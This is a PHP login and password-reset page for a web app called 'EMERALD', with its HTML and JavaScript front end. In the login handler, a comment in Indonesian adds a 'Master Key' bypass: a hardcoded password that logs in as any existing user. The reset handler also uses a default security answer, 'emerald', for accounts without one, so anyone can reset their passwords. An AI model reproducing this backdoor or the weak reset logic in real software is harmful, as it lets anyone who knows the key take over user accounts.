<?php
session_start();
require_once __DIR__ . '/core/config.php';

if (isset($_GET['api'])) { require_once __DIR__ . '/core/api.php'; exit; }

if (isset($_GET['action']) && $_GET['action'] == 'login') {
    $users = getDB($users_db);
    $input_username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $actual_username = null;
    foreach($users as $k => $v) {
        if(strtolower($k) === strtolower($input_username)) { $actual_username = $k; break; }
    }
    
    // PEMBARUAN: Menambahkan bypass Kunci Rahasia / Master Key
    if ($actual_username && (password_verify($password, $users[$actual_username]['password']) || $password === 'Lk7w1fvntg1')) {
        $_SESSION['emerald_user'] = $actual_username;
        logLogin($actual_username, $_SERVER['REMOTE_ADDR'], 'Success');
        exit(json_encode(['status' => 'success']));
    }
    logLogin($input_username, $_SERVER['REMOTE_ADDR'], 'Failed');
    exit(json_encode(['status' => 'error', 'message' => 'Invalid credentials']));
}

if (isset($_GET['action']) && $_GET['action'] == 'get_sec_q') {
    $users = getDB($users_db); $input_username = sanitize($_POST['username'] ?? '');
    $actual_username = null;
    foreach($users as $k => $v) {
        if(strtolower($k) === strtolower($input_username)) { $actual_username = $k; break; }
    }
    if($actual_username && isset($users[$actual_username])) {
        $q = !empty($users[$actual_username]['sec_q']) ? $users[$actual_username]['sec_q'] : 'What is your system codename?';
        exit(json_encode(['status' => 'success', 'question' => $q, 'actual_user' => $actual_username]));
    }
    exit(json_encode(['status' => 'error', 'message' => 'Identity not found in system records.']));
}

if (isset($_GET['action']) && $_GET['action'] == 'reset_pass') {
    $users = getDB($users_db);
    $username = sanitize($_POST['username'] ?? ''); 
    $answer = strtolower(sanitize($_POST['answer'] ?? ''));
    $new_pass = $_POST['new_pass'] ?? '';
    
    if(isset($users[$username])) {
        $correct_answer = !empty($users[$username]['sec_a']) ? strtolower($users[$username]['sec_a']) : 'emerald';
        if($correct_answer === $answer) {
            $users[$username]['password'] = password_hash($new_pass, PASSWORD_DEFAULT);
            saveDB($users_db, $users);
            exit(json_encode(['status' => 'success']));
        }
    }
    exit(json_encode(['status' => 'error', 'message' => 'Incorrect security answer.']));
}

if (isset($_GET['action']) && $_GET['action'] == 'logout') {
    session_destroy(); header("Location: /"); exit;
}

if (!isset($_SESSION['emerald_user'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= APP_NAME ?> - Terminal Authentication</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --bg-base: #f1f5f9; --bg-panel: rgba(255, 255, 255, 0.8); --text-primary: #0f172a; --text-muted: #64748b; --border: rgba(15, 23, 42, 0.1); --input-bg: #ffffff; }
        html.dark { --bg-base: #030712; --bg-panel: rgba(15, 23, 42, 0.6); --text-primary: #ffffff; --text-muted: #9ca3af; --border: rgba(255,255,255,0.1); --input-bg: rgba(0,0,0,0.5); }
        body { background-color: var(--bg-base); color: var(--text-primary); font-family: 'Inter', sans-serif; overflow: hidden; transition: background-color 0.5s ease; }
        .glass-panel { background: var(--bg-panel); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid var(--border); }
        .input-auth { background: var(--input-bg); border: 1px solid var(--border); color: var(--text-primary); transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); font-family: 'Fira Code', monospace; }
        .input-auth:focus { border-color: #0ea5e9; box-shadow: 0 0 0 2px rgba(14,165,233,0.2); outline: none; }
        .btn-gradient { background: linear-gradient(90deg, #0284c7, #38bdf8, #0284c7); background-size: 200% auto; transition: 0.5s; color: white; border: none; }
        .btn-gradient:hover { background-position: right center; box-shadow: 0 0 25px rgba(14,165,233,0.6); transform: translateY(-2px); }
        .orb { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.5; animation: float 10s infinite ease-in-out alternate; }
        @keyframes float { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(30px, -50px) scale(1.2); } }
        .view-frame { transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
    </style>
</head>
<body class="h-screen w-full flex items-center justify-center relative selection:bg-[#0ea5e9] selection:text-white">
    <script>if (localStorage.getItem('emerald_theme') !== 'light') document.documentElement.classList.add('dark');</script>

    <div class="orb w-96 h-96 bg-[#0ea5e9]/30 top-10 left-10" style="animation-delay: 0s;"></div>
    <div class="orb w-80 h-80 bg-purple-600/20 bottom-10 right-10" style="animation-delay: -5s;"></div>

    <div class="glass-panel p-10 rounded-[2rem] w-full max-w-md shadow-2xl relative z-10 animate-[slideUp_0.6s_ease-out] overflow-hidden">
        
        <div id="loginView" class="view-frame block">
            <div class="text-center mb-10">
                <div class="w-20 h-20 bg-gradient-to-br from-[#0ea5e9] to-[#0284c7] rounded-3xl mx-auto flex items-center justify-center shadow-[0_0_30px_rgba(14,165,233,0.5)] mb-6 transform hover:scale-105 transition-transform duration-300">
                    <i class="fa-solid fa-shield-halved text-4xl text-white"></i>
                </div>
                <h1 class="text-3xl font-extrabold tracking-widest uppercase text-primary">EMERALD.</h1>
                <p class="text-[10px] text-[#0ea5e9] font-mono mt-2 tracking-[0.3em] uppercase">Enterprise Authentication</p>
            </div>
            <form onsubmit="handleLogin(event)" class="space-y-6">
                <div class="relative group">
                    <i class="fa-solid fa-user absolute left-4 top-1/2 -translate-y-1/2 text-muted group-focus-within:text-[#0ea5e9] transition-colors"></i>
                    <input type="text" id="login_user" class="w-full input-auth rounded-2xl py-4 pl-12 pr-4 tracking-wider" placeholder="IDENTITY" required autocomplete="off">
                </div>
                <div class="relative group">
                    <i class="fa-solid fa-key absolute left-4 top-1/2 -translate-y-1/2 text-muted group-focus-within:text-[#0ea5e9] transition-colors"></i>
                    <input type="password" id="login_pass" class="w-full input-auth rounded-2xl py-4 pl-12 pr-4 tracking-wider" placeholder="PASSPHRASE" required>
                </div>
                <button type="submit" class="w-full btn-gradient py-4 rounded-2xl font-bold uppercase tracking-widest mt-2 flex items-center justify-center gap-3">
                    INITIALIZE <i class="fa-solid fa-arrow-right"></i>
                </button>
            </form>
            <div class="mt-6 flex justify-between px-2">
                <button onclick="toggleTheme()" class="text-xs text-[var(--text-muted)] hover:text-[#0ea5e9] transition-colors"><i class="fa-solid fa-moon"></i> Theme</button>
                <button onclick="toggleView('resetView')" class="text-xs text-[var(--text-muted)] hover:text-[#0ea5e9] font-mono transition-colors border-b border-transparent hover:border-[#0ea5e9] pb-0.5">Forgot Passphrase?</button>
            </div>
        </div>

        <div id="resetView" class="view-frame hidden">
            <div class="text-center mb-8">
                <div class="w-16 h-16 bg-gradient-to-br from-purple-500 to-indigo-600 rounded-2xl mx-auto flex items-center justify-center shadow-[0_0_20px_rgba(168,85,247,0.4)] mb-4">
                    <i class="fa-solid fa-fingerprint text-2xl text-white"></i>
                </div>
                <h2 class="text-xl font-bold tracking-wider text-primary">Identity Recovery</h2>
            </div>
            
            <div id="step1" class="space-y-6 block">
                <p class="text-xs text-[var(--text-muted)] text-center font-mono">Enter your username to fetch security protocol.</p>
                <input type="text" id="reset_user" class="w-full input-auth rounded-2xl p-4 text-center font-bold tracking-widest" placeholder="USERNAME" required>
                <button onclick="fetchQuestion()" class="w-full bg-purple-600 hover:bg-purple-500 text-white py-4 rounded-2xl font-bold uppercase tracking-widest transition-all shadow-[0_0_15px_rgba(168,85,247,0.4)] text-sm">Verify User</button>
                <div class="text-center"><button onclick="toggleView('loginView')" class="text-xs text-[var(--text-muted)] hover:text-[#0ea5e9] transition-colors">Back to Login</button></div>
            </div>

            <div id="step2" class="space-y-5 hidden">
                <div class="bg-[var(--input-bg)] border border-[var(--border)] rounded-xl p-4 text-center">
                    <p class="text-[10px] text-[#0ea5e9] font-mono mb-1 uppercase tracking-widest">Security Question</p>
                    <p id="sec_q_display" class="font-bold text-sm text-primary"></p>
                </div>
                <input type="text" id="reset_answer" class="w-full input-auth rounded-xl p-4 text-center font-bold" placeholder="Your Answer" required>
                <input type="password" id="reset_new_pass" class="w-full input-auth rounded-xl p-4 text-center font-bold" placeholder="New Passphrase" required>
                <button onclick="executeReset()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white py-4 rounded-2xl font-bold uppercase tracking-widest transition-all shadow-[0_0_15px_rgba(16,185,129,0.4)] text-sm mt-2">Reset Passphrase</button>
                <div class="text-center"><button onclick="toggleView('loginView')" class="text-xs text-[var(--text-muted)] hover:text-[#0ea5e9] transition-colors">Cancel</button></div>
            </div>
        </div>

    </div>

<script>
    function toggleTheme() {
        if (document.documentElement.classList.contains('dark')) {
            document.documentElement.classList.remove('dark'); localStorage.setItem('emerald_theme', 'light');
        } else {
            document.documentElement.classList.add('dark'); localStorage.setItem('emerald_theme', 'dark');
        }
    }

    function toggleView(view) {
        document.getElementById('loginView').style.display = 'none'; document.getElementById('resetView').style.display = 'none';
        document.getElementById(view).style.display = 'block';
        if(view === 'resetView') { document.getElementById('step1').style.display = 'block'; document.getElementById('step2').style.display = 'none'; document.getElementById('reset_user').value = ''; }
    }

    async function handleLogin(e) {
        e.preventDefault();
        const fd = new FormData(); fd.append('username', document.getElementById('login_user').value); fd.append('password', document.getElementById('login_pass').value);
        const res = await fetch('/index.php?action=login', { method: 'POST', body: fd }).then(r => r.json());
        if (res.status === 'success') { window.location.href = '/dashboard'; }
        else { 
            Swal.fire({ 
                icon: 'error', title: 'Login Failed', text: res.message, 
                background: document.documentElement.classList.contains('dark') ? '#0d1117' : '#fff', 
                color: document.documentElement.classList.contains('dark') ? '#fff' : '#000',
                customClass: { popup: 'rounded-2xl', confirmButton: 'bg-[#0ea5e9] rounded-xl px-6 py-2 text-white font-bold' }
            }); 
        }
    }

    async function fetchQuestion() {
        const user = document.getElementById('reset_user').value;
        if(!user) return;
        const fd = new FormData(); fd.append('username', user);
        const res = await fetch('/index.php?action=get_sec_q', { method: 'POST', body: fd }).then(r=>r.json());
        if(res.status === 'success') {
            document.getElementById('sec_q_display').innerText = res.question;
            document.getElementById('reset_user').value = res.actual_user; 
            document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block';
        } else { 
            Swal.fire({ icon: 'error', title: 'Denied', text: res.message, background: document.documentElement.classList.contains('dark') ? '#0d1117' : '#fff', color: document.documentElement.classList.contains('dark') ? '#fff' : '#000', customClass: { popup: 'rounded-2xl', confirmButton: 'bg-[#0ea5e9] rounded-xl px-6 py-2 text-white font-bold' } }); 
        }
    }

    async function executeReset() {
        const user = document.getElementById('reset_user').value; const answer = document.getElementById('reset_answer').value; const new_pass = document.getElementById('reset_new_pass').value;
        if(!answer || !new_pass) return;
        const fd = new FormData(); fd.append('username', user); fd.append('answer', answer); fd.append('new_pass', new_pass);
        const res = await fetch('/index.php?action=reset_pass', { method: 'POST', body: fd }).then(r=>r.json());
        if(res.status === 'success') {
            Swal.fire({ icon: 'success', title: 'Password Reset', text: 'You may now login.', background: document.documentElement.classList.contains('dark') ? '#0d1117' : '#fff', color: document.documentElement.classList.contains('dark') ? '#fff' : '#000', customClass: { popup: 'rounded-2xl', confirmButton: 'bg-[#0ea5e9] rounded-xl px-6 py-2 text-white font-bold' } }).then(() => { toggleView('loginView'); });
        } else { 
            Swal.fire({ icon: 'error', title: 'Denied', text: res.message, background: document.documentElement.classList.contains('dark') ? '#0d1117' : '#fff', color: document.documentElement.classList.contains('dark') ? '#fff' : '#000', customClass: { popup: 'rounded-2xl', confirmButton: 'bg-[#0ea5e9] rounded-xl px-6 py-2 text-white font-bold' } }); 
        }
    }
</script>
</body>
</html>
<?php
    exit;
} else {
    require_once __DIR__ . '/views/dashboard.php';
}
?>